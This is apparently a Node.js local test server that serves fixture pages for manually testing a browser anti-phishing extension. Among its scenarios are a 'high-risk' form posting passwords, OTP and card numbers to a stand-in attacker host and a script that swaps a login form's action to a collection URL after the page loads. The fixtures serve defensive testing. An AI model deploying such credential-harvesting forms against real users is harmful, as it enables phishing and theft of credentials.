import http from "node:http";

const host = "127.0.0.1";
const port = Number(process.env.CAPSTONE_MANUAL_PORT || 41731);

function pageTemplate(title, body, extraHead = "", extraScript = "") {
  return `<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>${title}</title>
  <style>
    body { font-family: Segoe UI, Tahoma, sans-serif; margin: 24px; line-height: 1.45; }
    h1 { margin-bottom: 8px; }
    .card { border: 1px solid #ccc; border-radius: 8px; padding: 16px; margin-top: 12px; }
    .pill { display: inline-block; border-radius: 12px; padding: 2px 10px; background: #f0f0f0; margin-right: 8px; }
    code { background: #f5f5f5; padding: 2px 6px; border-radius: 4px; }
    nav a { margin-right: 12px; }
  </style>
  ${extraHead}
</head>
<body>
  <nav>
    <a href="/">Index</a>
    <a href="/benign">Benign</a>
    <a href="/suspicious">Suspicious</a>
    <a href="/high-risk">High-risk</a>
    <a href="/dynamic">Dynamic</a>
    <a href="/privacy">Privacy</a>
  </nav>
  ${body}
  ${extraScript}
</body>
</html>`;
}

const indexHtml = pageTemplate(
  "CAPSTONE-1 Manual Browser Scenarios",
  `<h1>CAPSTONE-1 Manual Scenario Index</h1>
  <p>Use these controlled pages for manual extension acceptance.</p>
  <div class="card">
    <div><span class="pill">BENIGN</span><a href="/benign">/benign</a></div>
    <div><span class="pill">SUSPICIOUS</span><a href="/suspicious">/suspicious</a></div>
    <div><span class="pill">HIGH_RISK</span><a href="/high-risk">/high-risk</a></div>
    <div><span class="pill">DYNAMIC</span><a href="/dynamic">/dynamic</a></div>
    <div><span class="pill">PRIVACY</span><a href="/privacy">/privacy</a></div>
  </div>
  <div class="card">
    <p>DNR manual target URL:</p>
    <code>http://test-phish-dnr-blocked.example.com/</code>
  </div>`
);

const benignHtml = pageTemplate(
  "Benign Scenario",
  `<h1>Benign Scenario</h1>
  <p>Expected policy outcome: ALLOWED (same-domain authentication).</p>
  <form action="/login" method="post">
    <label>Email <input type="email" name="email" autocomplete="email" /></label><br /><br />
    <label>Password <input type="password" name="password" autocomplete="current-password" /></label><br /><br />
    <button type="submit">Sign In</button>
  </form>`
);

const suspiciousHtml = pageTemplate(
  "Suspicious Scenario",
  `<h1>Suspicious Scenario</h1>
  <p>Expected policy outcome: WARNED (cross-domain credential request).</p>
  <form action="https://cross-destination.untrusted-auth.net/login" method="post">
    <label>Email <input type="email" name="email" autocomplete="email" /></label><br /><br />
    <label>Password <input type="password" name="password" autocomplete="current-password" /></label><br /><br />
    <label>OTP <input type="text" name="otp" autocomplete="one-time-code" /></label><br /><br />
    <button type="submit">Continue</button>
  </form>`
);

const highRiskHtml = pageTemplate(
  "High-risk Synthetic Scenario",
  `<h1>High-risk Synthetic Scenario</h1>
  <p>Expected policy outcome: CONTAINED_AFTER_LOAD or BLOCKED.</p>
  <form action="https://credential-harvest.synthetic-attacker.example/submit" method="post">
    <label>Email <input type="email" name="email" autocomplete="email" /></label><br /><br />
    <label>Password <input type="password" name="password" autocomplete="current-password" /></label><br /><br />
    <label>OTP <input type="text" name="otp" autocomplete="one-time-code" /></label><br /><br />
    <label>Card <input type="text" name="card" autocomplete="cc-number" /></label><br /><br />
    <button type="submit">Verify & Submit</button>
  </form>`
);

const dynamicHtml = pageTemplate(
  "Dynamic DOM Scenario",
  `<h1>Dynamic DOM Scenario</h1>
  <p>Expected: dynamic password/OTP/form/action changes are detected.</p>
  <div id="host" class="card">Waiting for dynamic mutations...</div>`,
  "",
  `<script>
    const host = document.getElementById("host");

    setTimeout(() => {
      const form = document.createElement("form");
      form.id = "dynamic-login";
      form.action = "https://dynamic-start.example/login";
      form.method = "post";

      const user = document.createElement("input");
      user.type = "text";
      user.name = "username";
      user.autocomplete = "username";

      const pass = document.createElement("input");
      pass.type = "password";
      pass.name = "password";
      pass.autocomplete = "current-password";

      form.appendChild(user);
      form.appendChild(document.createElement("br"));
      form.appendChild(pass);
      host.appendChild(form);
      host.appendChild(document.createElement("hr"));
      host.appendChild(document.createTextNode("Step 1 complete: dynamic form + password."));
    }, 700);

    setTimeout(() => {
      const form = document.getElementById("dynamic-login");
      if (form) {
        const otp = document.createElement("input");
        otp.type = "text";
        otp.name = "otp";
        otp.autocomplete = "one-time-code";
        form.appendChild(document.createElement("br"));
        form.appendChild(otp);
      }
      host.appendChild(document.createElement("hr"));
      host.appendChild(document.createTextNode("Step 2 complete: dynamic OTP."));
    }, 1500);

    setTimeout(() => {
      const form = document.getElementById("dynamic-login");
      if (form) {
        form.action = "https://dynamic-changed.example/collect";
      }
      host.appendChild(document.createElement("hr"));
      host.appendChild(document.createTextNode("Step 3 complete: form action changed."));
    }, 2300);
  </script>`
);

const privacyHtml = pageTemplate(
  "Privacy Boundary Scenario",
  `<h1>Privacy Boundary Scenario</h1>
  <p>Expected: input.value getter should not be read by extension collector.</p>
  <form action="/noop" method="post">
    <label>User <input id="u" type="text" name="user" value="victim_user" /></label><br /><br />
    <label>Password <input id="p" type="password" name="password" value="SuperSecretPassword123!" /></label><br /><br />
    <label>OTP <input id="o" type="text" name="otp" value="998877" /></label>
  </form>
  <div class="card" id="privacy-log">value getter reads: 0</div>`,
  "",
  `<script>
    let valueReadCount = 0;
    const desc = Object.getOwnPropertyDescriptor(HTMLInputElement.prototype, "value");
    if (desc && desc.get && desc.set) {
      Object.defineProperty(HTMLInputElement.prototype, "value", {
        get: function () {
          valueReadCount += 1;
          const el = document.getElementById("privacy-log");
          if (el) el.textContent = "value getter reads: " + valueReadCount;
          return desc.get.call(this);
        },
        set: function (v) {
          return desc.set.call(this, v);
        }
      });
    }
  </script>`
);

const server = http.createServer((req, res) => {
  const url = req.url || "/";
  const map = {
    "/": indexHtml,
    "/benign": benignHtml,
    "/suspicious": suspiciousHtml,
    "/high-risk": highRiskHtml,
    "/dynamic": dynamicHtml,
    "/privacy": privacyHtml,
  };

  const body = map[url] || pageTemplate("Not Found", `<h1>404</h1><p>${url}</p>`);
  const status = map[url] ? 200 : 404;
  res.writeHead(status, { "content-type": "text/html; charset=utf-8" });
  res.end(body);
});

server.listen(port, host, () => {
  console.log("CAPSTONE_MANUAL_SERVER_READY");
  console.log(`URL=http://${host}:${port}/`);
  console.log("DNR_TARGET=http://test-phish-dnr-blocked.example.com/");
});
